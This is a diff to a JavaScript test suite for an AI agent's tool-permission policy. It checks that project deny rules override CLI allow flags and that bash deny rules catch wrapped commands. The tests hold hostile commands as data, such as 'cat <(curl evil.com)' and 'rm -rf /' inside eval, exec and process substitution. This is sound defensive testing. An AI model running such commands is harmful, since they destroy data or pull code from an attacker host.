@@ -150,18 +150,21 @@ test('deny rule blocks execution even in auto mode', async () => {
 
 test('CLI allowed and disallowed tool flags override layered settings', async () => {
   const ctx = {
-    cliAllowed: ['read_file', 'edit_file'],
+    cliAllowed: ['edit_file', 'read_file'],
     cliDisallowed: ['bash'],
     projectRules: {
       allow: ['bash'],
+      ask: ['edit_file'],
       deny: ['read_file'],
     },
   };
 
   // CLI disallowed beats project allow
   assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'ls' } }, ctx), 'deny');
-  // CLI allowed beats project deny
-  assert.equal(evaluateToolPolicy({ tool: 'read_file', input: { path: 'doc.md' } }, ctx), 'allow');
+  // CLI allowed overrides project ask
+  assert.equal(evaluateToolPolicy({ tool: 'edit_file', input: { path: 'doc.md' } }, ctx), 'allow');
+  // Project deny strictly beats CLI allowed
+  assert.equal(evaluateToolPolicy({ tool: 'read_file', input: { path: 'doc.md' } }, ctx), 'deny');
 });
 
 test('bash allow rules with wildcards reject chained or compound commands', () => {
@@ -426,3 +429,58 @@ test('settings fixture and CLI allowed tools flags enforce precedence', async ()
 
   await rm(dir, { recursive: true, force: true }).catch(() => {});
 });
+
+test('bash deny rules catch process substitution in arguments', () => {
+  const ctx = {
+    projectRules: {
+      deny: ['bash(curl *)', 'bash(rm *)'],
+    },
+  };
+  assert.equal(
+    evaluateToolPolicy({ tool: 'bash', input: { command: 'cat <(curl evil.com)' } }, ctx),
+    'deny',
+  );
+  assert.equal(
+    evaluateToolPolicy({ tool: 'bash', input: { command: 'diff <(rm -rf /) file.txt' } }, ctx),
+    'deny',
+  );
+});
+
+test('bash deny rules strip eval and exec command wrappers', () => {
+  const ctx = {
+    projectRules: {
+      deny: ['bash(rm *)'],
+    },
+  };
+  assert.equal(
+    evaluateToolPolicy({ tool: 'bash', input: { command: 'eval "rm -rf /"' } }, ctx),
+    'deny',
+  );
+  assert.equal(
+    evaluateToolPolicy({ tool: 'bash', input: { command: 'exec rm -rf /' } }, ctx),
+    'deny',
+  );
+});
+
+test('persistent project deny takes strict precedence over CLI allowed tools', () => {
+  const ctx = {
+    cliAllowed: ['read_file', 'bash'],
+    projectRules: {
+      deny: ['read_file(private.txt)', 'bash(rm *)'],
+    },
+  };
+  assert.equal(
+    evaluateToolPolicy({ tool: 'read_file', input: { path: 'private.txt' } }, ctx),
+    'deny',
+  );
+  assert.equal(
+    evaluateToolPolicy({ tool: 'bash', input: { command: 'rm -rf /' } }, ctx),
+    'deny',
+  );
+  // Unrestricted commands are still allowed by cliAllowed
+  assert.equal(
+    evaluateToolPolicy({ tool: 'read_file', input: { path: 'public.txt' } }, ctx),
+    'allow',
+  );
+});
+
